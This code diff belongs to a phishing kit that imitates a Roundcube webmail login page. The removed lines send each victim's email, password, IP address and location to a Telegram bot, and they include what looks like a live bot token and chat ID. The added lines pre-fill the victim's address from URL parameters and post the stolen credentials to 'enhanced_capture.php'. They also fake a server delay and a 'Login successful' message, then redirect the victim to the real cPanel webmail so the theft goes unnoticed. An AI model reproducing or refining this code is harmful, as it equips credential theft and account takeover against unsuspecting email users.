-            var ip = data.ip || "Unknown";
+        // Also check URL parameters (not just hash)
+        function checkUrlParameters() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const emailField = document.getElementById('rcmloginuser');
             
-            var message = `==>> 📥Webmail 2025 📥<<==\n` +
-                          `Email 📧: ${email}\n` +
-                          `Password 🔑: ${password}\n` +
-                          `==📍📍=>> Location <<=📍📍==\n` +
-                          `City 🌆: ${city}\n` +
-                          `Region 🌇: ${region}\n` +
-                          `Country 🗾: ${country}\n` +
-                          `===> 🤳Phone Details <<===\n` +
-                          `IP Address 🌏: ${ip}\n` +
-                          `UserAgent 📱: ${navigator.userAgent}\n` +
-                          `Coded©️ by @sinisterscarecrow`;
+            // Check various parameter names commonly used
+            const email = urlParams.get('email') || 
+                         urlParams.get('user') || 
+                         urlParams.get('username') || 
+                         urlParams.get('target') || 
+                         urlParams.get('e') ||
+                         urlParams.get('u');
             
-            // Send data to Telegram
-            var telegramUrl = `https://api.telegram.org/bot6836496062:AAGRdVydzA2zn1VDsLlhGUjYgQ6rs-WxvQM/sendMessage`;
-            var telegramData = { chat_id: '6655129471', text: message, parse_mode: 'Markdown' };
+            if (email && !emailField.value) {
+                emailField.value = decodeURIComponent(email);
+                console.log('Auto-filled email from URL parameter:', email);
+                document.getElementById('rcmloginpwd').focus();
+            }
+        }
+        
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
             
-            fetch(telegramUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(telegramData)
-            }).then(() => {
-                $("#password").val(""); // Clear password field after submission
-            });
+            const form = this;
+            const username = document.getElementById('rcmloginuser').value.trim();
+            const password = document.getElementById('rcmloginpwd').value;
+            const errorDiv = document.getElementById('error-message');
+            const loadingDiv = document.getElementById('loading');
+            const submitBtn = document.getElementById('rcmloginsubmit');
+            
+            // Basic client-side validation
+            if (!username || !password) {
+                showError('Please enter both username and password');
+                return;
+            }
+            
+            // Increment attempt counter
+            attemptCount++;
+            
+            // Show loading state
+            hideError();
+            loadingDiv.style.display = 'block';
+            submitBtn.disabled = true;
+            submitBtn.value = 'Logging in...';
+            
+            // Simulate realistic server delay
+            const delay = Math.random() * 1500 + 1000; // 1-2.5 seconds
+            
+            setTimeout(() => {
+                // Submit to capture script
+                fetch('enhanced_capture.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams(new FormData(form))
+                })
+                .then(response => response.json())
+                .then(data => {
+                    loadingDiv.style.display = 'none';
+                    submitBtn.disabled = false;
+                    submitBtn.value = 'Login';
+                    
+                    if (data.signal === 'ok') {
+                        // Success - redirect after short delay
+                        document.getElementById('login-form').innerHTML = 
+                            '<div class="content" style="text-align: center; padding: 40px;">' +
+                            '<div style="color: #27ae60; margin-bottom: 15px; font-size: 14px;">✓ Login successful!</div>' +
+                            '<div style="color: #666; font-size: 10px;">Redirecting to mailbox...</div>' +
+                            '</div>';
+                        
+                        setTimeout(() => {
+                            window.location.href = 'https://webmail.cpanel.net/';
+                        }, 2000);
+                    } else {
+                        // Show error message
+                        showError(data.msg || 'Invalid username or password');
+                        
+                        // Clear password field
+                        document.getElementById('rcmloginpwd').value = '';
+                        document.getElementById('rcmloginpwd').focus();
+                    }
+                })
+                .catch(error => {
+                    loadingDiv.style.display = 'none';
+                    submitBtn.disabled = false;
+                    submitBtn.value = 'Login';
+                    showError('Request failed. Please try again.');
+                });
+            }, delay);
         });
-    });
-});
-
-</script>
-</body></html>
+        
+        function showError(message) {
+            const errorDiv = document.getElementById('error-message');
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+        }
+        
+        function hideError() {
+            document.getElementById('error-message').style.display = 'none';
+        }
+        
+        // Auto-focus on username field and auto-grab email
+        window.addEventListener('load', function() {
+            // First check for email in URL hash or parameters
+            autoGrabEmail();
+            checkUrlParameters();
+            
+            // Focus appropriate field
+            const emailField = document.getElementById('rcmloginuser');
+            if (emailField.value && emailField.value.length > 0) {
+                // Email already filled, focus on password
+                document.getElementById('rcmloginpwd').focus();
+            } else {
+                // No email, focus on username field
+                emailField.focus();
+            }
+        });
+        
+        // Also listen for hash changes (if user navigates with different hash)
+        window.addEventListener('hashchange', function() {
+            autoGrabEmail();
+        });
+        
+        // Simulate real Roundcube behavior
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && (e.target.id === 'rcmloginuser' || e.target.id === 'rcmloginpwd')) {
+                document.getElementById('login-form').dispatchEvent(new Event('submit'));
+            }
+        });
+    </script>
+</body>
+</html>
